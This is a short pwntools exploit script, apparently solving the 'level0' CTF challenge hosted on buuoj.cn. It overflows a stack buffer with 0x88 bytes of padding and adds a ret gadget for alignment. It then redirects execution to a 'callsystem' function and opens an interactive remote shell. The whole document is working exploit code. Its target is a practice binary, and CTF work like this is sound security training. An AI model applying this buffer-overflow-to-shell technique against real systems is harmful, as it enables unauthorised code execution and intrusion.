from pwn import *

context.log_level = "debug"

exe = ELF("./level0")
# r = process("./level0")
r = remote("node4.buuoj.cn", 25039)

ret = p64(0x400431)

# return instruction is import on local for stack alignment.
# On remote, the ubuntu container version is 16.04 so no need
# to stack alignment.

# 0x0000000000400431: ret;
r.recvuntil(b"d\n")
r.sendline(cyclic(0x88) + ret + p64(exe.sym["callsystem"]))
r.interactive()
